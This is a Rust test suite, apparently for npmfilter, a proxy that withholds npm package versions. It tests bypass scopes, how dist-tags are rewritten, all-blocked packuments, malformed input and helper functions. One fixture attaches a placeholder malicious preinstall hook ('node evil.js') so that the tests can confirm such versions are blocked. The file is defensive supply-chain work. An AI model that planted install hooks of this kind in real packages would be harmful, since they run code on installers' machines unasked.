fn bypass_scope_does_not_leak_to_other_scopes_or_unscoped_packages() {
    let other = Fixture::new("@evil/core")
        .version("1.0.0", Some(RECENT), Some("sha512-aaa"), &[])
        .build();
    let unscoped = Fixture::new("olamedia")
        .version("1.0.0", Some(RECENT), Some("sha512-aaa"), &[])
        .build();
    let harness = Harness::new().with_bypass(&["@olamedia"]);

    assert_eq!(
        block_for(&harness.run(&other), "1.0.0").reason,
        BlockReason::TooNew
    );
    assert_eq!(
        block_for(&harness.run(&unscoped), "1.0.0").reason,
        BlockReason::TooNew
    );
}

#[test]
fn deny_rule_beats_a_bypass_scope() {
    let packument = Fixture::new("@olamedia/core")
        .version("1.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .build();
    let outcome = Harness::new()
        .with_bypass(&["@olamedia"])
        .with_rule(Rule::deny("@olamedia/core", "1.0.0"))
        .run(&packument);

    assert_eq!(block_for(&outcome, "1.0.0").reason, BlockReason::DenyRule);
}

// -- document rebuild: dist-tags ---------------------------------------------------------

// The default is that a tag is NEVER moved. `latest` keeps meaning latest, so a client asking
// for a withheld version fails to resolve — which is the truth — instead of being handed an
// older release it never asked for. Observed live before this was fixed: `sqlite3` had 102 of
// 104 versions withheld, `latest` was moved from 6.0.1 to 2.1.3 (2014), and the install died
// inside `node-gyp` with nothing naming npmfilter.

#[test]
fn a_tag_pointing_at_a_blocked_version_is_left_pointing_at_it() {
    let packument = Fixture::new("wide")
        .version("2.0.0", Some(OLD), Some("sha512-a"), &[])
        .version("10.0.0", Some(OLD), Some("sha512-b"), &[])
        .version("11.0.0", Some(RECENT), Some("sha512-c"), &[])
        .tag("latest", "11.0.0")
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(
        tag_of(&outcome, "latest"),
        Some("11.0.0"),
        "latest must keep naming the version upstream published, even when it is withheld"
    );
    assert!(
        !served(&outcome).contains(&"11.0.0".to_owned()),
        "the withheld version is still absent from `versions`, so resolving the tag fails"
    );
}

#[test]
fn a_tag_pointing_at_a_surviving_version_is_left_alone() {
    let packument = Fixture::new("tagged")
        .version("1.0.0", Some(OLD), Some("sha512-a"), &[])
        .version("2.0.0", Some(OLD), Some("sha512-b"), &[])
        .version("3.0.0", Some(RECENT), Some("sha512-c"), &[])
        .tag("latest", "3.0.0")
        .tag("legacy", "1.0.0")
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(tag_of(&outcome, "latest"), Some("3.0.0"));
    assert_eq!(tag_of(&outcome, "legacy"), Some("1.0.0"));
}

#[test]
fn no_tag_is_ever_downgraded_onto_an_older_release() {
    let packument = Fixture::new("pre")
        .version("1.0.0", Some(OLD), Some("sha512-a"), &[])
        .version("2.0.0", Some(RECENT), Some("sha512-b"), &[])
        .version("3.0.0-beta.1", Some(OLD), Some("sha512-c"), &[])
        .tag("latest", "2.0.0")
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(tag_of(&outcome, "latest"), Some("2.0.0"));
}

#[test]
fn a_tag_naming_a_version_that_does_not_exist_upstream_is_left_alone() {
    let packument = Fixture::new("ghost")
        .version("1.0.0", Some(OLD), Some("sha512-a"), &[])
        .tag("latest", "9.9.9")
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(tag_of(&outcome, "latest"), Some("9.9.9"));
}

// -- document rebuild: the opt-in downgrade ----------------------------------------------

#[test]
fn downgrade_opt_in_repoints_a_blocked_tag_semver_aware() {
    let packument = Fixture::new("wide")
        .version("2.0.0", Some(OLD), Some("sha512-a"), &[])
        .version("10.0.0", Some(OLD), Some("sha512-b"), &[])
        .version("11.0.0", Some(RECENT), Some("sha512-c"), &[])
        .tag("latest", "11.0.0")
        .build();
    let outcome = Harness::new().with_dist_tag_downgrade().run(&packument);

    // Lexicographic ordering would have picked "2.0.0".
    assert_eq!(tag_of(&outcome, "latest"), Some("10.0.0"));
}

#[test]
fn downgrade_opt_in_never_moves_a_stable_tag_onto_a_prerelease() {
    let packument = Fixture::new("pre")
        .version("1.0.0", Some(OLD), Some("sha512-a"), &[])
        .version("2.0.0", Some(RECENT), Some("sha512-b"), &[])
        .version("3.0.0-beta.1", Some(OLD), Some("sha512-c"), &[])
        .tag("latest", "2.0.0")
        .build();
    let outcome = Harness::new().with_dist_tag_downgrade().run(&packument);

    assert_eq!(tag_of(&outcome, "latest"), Some("1.0.0"));
}

#[test]
fn downgrade_opt_in_drops_a_tag_with_no_surviving_candidate() {
    let packument = Fixture::new("doomed")
        .version("1.0.0", Some(RECENT), Some("sha512-a"), &[])
        .tag("latest", "1.0.0")
        .build();
    let outcome = Harness::new().with_dist_tag_downgrade().run(&packument);

    assert_eq!(outcome.packument["dist-tags"], json!({}));
}

#[test]
fn dist_tags_are_not_synthesised_when_upstream_has_none() {
    let packument = Fixture::new("bare")
        .version("1.0.0", Some(OLD), Some("sha512-a"), &[])
        .without_tags()
        .build();
    let outcome = Harness::new().run(&packument);

    assert!(outcome.packument.get("dist-tags").is_none());
}

// -- document rebuild: all versions blocked ----------------------------------------------

#[test]
fn all_versions_blocked_yields_empty_versions_time_and_dist_tags() {
    let packument = Fixture::new("doomed")
        .version("1.0.0", Some(RECENT), Some("sha512-a"), &[])
        .version(
            "2.0.0",
            Some(OLD),
            Some("sha512-b"),
            &[("preinstall", "node evil.js")],
        )
        .tag("latest", "2.0.0")
        .tag("beta", "1.0.0")
        .build();
    let outcome = Harness::new().run(&packument);

    assert!(served(&outcome).is_empty());
    assert_eq!(outcome.blocked.len(), 2);
    assert_eq!(
        outcome.packument["dist-tags"],
        json!({"latest": "2.0.0", "beta": "1.0.0"}),
        "tags keep naming what upstream published; every one of them now fails to resolve, \
         which is the honest answer when nothing is installable"
    );
    assert_eq!(
        time_keys(&outcome),
        vec!["created".to_owned(), "modified".to_owned()]
    );
    assert_eq!(outcome.packument["versions"], json!({}));
}

// -- document rebuild: time --------------------------------------------------------------

#[test]
fn created_modified_and_orphan_time_entries_are_preserved() {
    let packument = Fixture::new("timed")
        .version("1.0.0", Some(OLD), Some("sha512-a"), &[])
        .version("2.0.0", Some(RECENT), Some("sha512-b"), &[])
        .orphan_time("0.9.0", OLD)
        .build();
    let outcome = Harness::new().run(&packument);

    let keys = time_keys(&outcome);
    assert!(keys.contains(&"created".to_owned()));
    assert!(keys.contains(&"modified".to_owned()));
    assert!(
        keys.contains(&"0.9.0".to_owned()),
        "time entries we never gated are left alone"
    );
    assert!(keys.contains(&"1.0.0".to_owned()));
    assert!(!keys.contains(&"2.0.0".to_owned()));
}

// -- malformed input ---------------------------------------------------------------------

#[test]
fn a_non_object_packument_is_an_error() {
    let harness = Harness::new();
    let err = evaluate(
        &json!("nope"),
        &harness.rules,
        &harness.ledger,
        &harness.config,
        now(),
    )
    .expect_err("must not panic");
    assert_eq!(err, PolicyError::NotAnObject);
}

#[test]
fn a_packument_without_a_name_is_an_error() {
    let harness = Harness::new();
    let err = evaluate(
        &json!({ "versions": {} }),
        &harness.rules,
        &harness.ledger,
        &harness.config,
        now(),
    )
    .expect_err("must not panic");
    assert_eq!(err, PolicyError::MissingName);
}

#[test]
fn a_packument_without_versions_is_an_error() {
    let harness = Harness::new();
    let err = evaluate(
        &json!({ "name": "x", "versions": "not-an-object" }),
        &harness.rules,
        &harness.ledger,
        &harness.config,
        now(),
    )
    .expect_err("must not panic");
    assert_eq!(err, PolicyError::MissingVersions);
}

#[test]
fn an_empty_versions_object_is_valid_and_yields_nothing() {
    let harness = Harness::new();
    let outcome = evaluate(
        &json!({ "name": "x", "versions": {}, "dist-tags": { "latest": "1.0.0" } }),
        &harness.rules,
        &harness.ledger,
        &harness.config,
        now(),
    )
    .expect("an empty packument is well formed");

    assert!(outcome.blocked.is_empty());
    assert!(served(&outcome).is_empty());
    // Upstream published this tag and npmfilter withheld nothing, so there is nothing to
    // report and nothing to rewrite. The tag is passed through exactly as it arrived.
    assert_eq!(outcome.packument["dist-tags"], json!({ "latest": "1.0.0" }));
}

// -- helpers and reasons -----------------------------------------------------------------

#[test]
fn block_records_carry_version_reason_and_detail() {
    let packument = Fixture::new("record")
        .version("1.2.3", Some(RECENT), Some("sha512-a"), &[])
        .build();
    let outcome = Harness::new().run(&packument);

    let record = &outcome.blocked[0];
    assert_eq!(record.version, "1.2.3");
    assert_eq!(record.reason, BlockReason::TooNew);
    assert!(!record.detail.is_empty());
    assert!(!record.public_detail.is_empty());
    assert_eq!(
        serde_json::to_value(record).expect("serialises"),
        json!({
            "version": "1.2.3",
            "reason": "too_new",
            "detail": record.detail,
            "public_detail": record.public_detail,
        })
    );
}

#[test]
fn only_content_changes_are_critical() {
    assert!(BlockReason::IntegrityChanged.is_critical());
    assert!(BlockReason::ScriptsChanged.is_critical());
    assert!(!BlockReason::DenyRule.is_critical());
    assert!(!BlockReason::TooNew.is_critical());
    assert!(!BlockReason::InstallScript.is_critical());
    assert_eq!(BlockReason::InstallScript.to_string(), "install_script");
    assert_eq!(BlockReason::ScriptsChanged.to_string(), "scripts_changed");
}

#[test]
fn package_scope_parses_only_real_scopes() {
    assert_eq!(package_scope("@olamedia/core"), Some("olamedia"));
    assert_eq!(package_scope("lodash"), None);
    assert_eq!(package_scope("@olamedia"), None);
    assert_eq!(package_scope("@/core"), None);
    assert_eq!(package_scope("@olamedia/"), None);
}

#[test]
fn install_hooks_helper_reads_only_the_three_lifecycle_hooks() {
    let meta = json!({
        "scripts": { "preinstall": "a", "prepare": "b", "postinstall": "c", "test": "d" }
    });
    assert_eq!(
        install_hooks(&meta),
        vec![
            ("preinstall", "a".to_owned()),
            ("postinstall", "c".to_owned())
        ]
    );
    assert!(install_hooks(&json!({})).is_empty());
    assert!(install_hooks(&json!({ "scripts": "nonsense" })).is_empty());
}

#[test]
fn version_integrity_helper_reads_dist_integrity() {
    assert_eq!(
        version_integrity(&json!({ "dist": { "integrity": "sha512-a" } })),
        Some("sha512-a")
    );
    assert_eq!(version_integrity(&json!({ "dist": {} })), None);
    assert_eq!(version_integrity(&json!({})), None);
}
